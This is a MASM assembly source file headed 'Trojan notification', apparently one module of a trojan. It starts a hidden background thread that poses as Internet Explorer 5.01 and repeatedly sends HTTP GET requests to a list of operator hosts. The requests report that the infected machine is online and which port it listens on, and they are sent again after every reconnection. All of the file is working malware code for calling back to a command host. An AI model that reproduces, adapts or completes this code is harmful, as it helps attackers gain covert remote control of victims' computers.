; Trojan notification
; #########################################################################

.data
        szHandleIdent   db      "Internet Explorer 5.01",0

.code

; Notify a single host, returns TRUE on success
Notify proc uses ebx lpURL: DWORD
        LOCAL   hRootHandle, lpBuf: DWORD

        ; URL buffer
        invoke  GlobalAlloc, GPTR, 2048
        mov     lpBuf, eax

        ; Build URL
        invoke  wsprintf, lpBuf, offset szNfyURLFmt, lpURL, BasePort

        ; Wait until connected to internet
        invoke  WaitUntilConnected

        ; Send GET request (notify)
        invoke  InternetOpen, offset szHandleIdent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0
        mov     hRootHandle, eax
        invoke  InternetOpenUrl, eax, lpBuf, NULL, 0, INTERNET_FLAG_RAW_DATA, 0
        xchg    eax, ebx
        .IF     ebx
                invoke  InternetCloseHandle, ebx
        .ENDIF
        invoke  InternetCloseHandle, hRootHandle

        ; Clean up
        invoke  GlobalFree, lpBuf
        xchg    eax, ebx
        ret
Notify endp

; Notify all the hosts
NotifyAll proc uses edi
        mov     edi, offset Hosts

@next:
        invoke  Notify, edi
        mNextListEntry @next
        ret
NotifyAll endp

; Infinite notify thread
NotifyThread proc lpParam: DWORD
        LOCAL   DoSend: DWORD

        mov     DoSend, TRUE
@inf:
        invoke  InternetGetConnectedState, 0, 0
        .IF     eax
                .IF     DoSend
                        invoke  NotifyAll
                        mov     DoSend, FALSE
                .ENDIF
        .ELSE
                mov     DoSend, TRUE
        .ENDIF
        invoke  Sleep, NotifyTimeout
        jmp     @inf

        xor     eax, eax
        ret
NotifyThread endp

; Start notify thread
StartNotify proc
        LOCAL   lpThreadId: DWORD
        invoke  CreateThread, NULL, 0, offset NotifyThread, 0, 0, addr lpThreadId
        ret
StartNotify endp
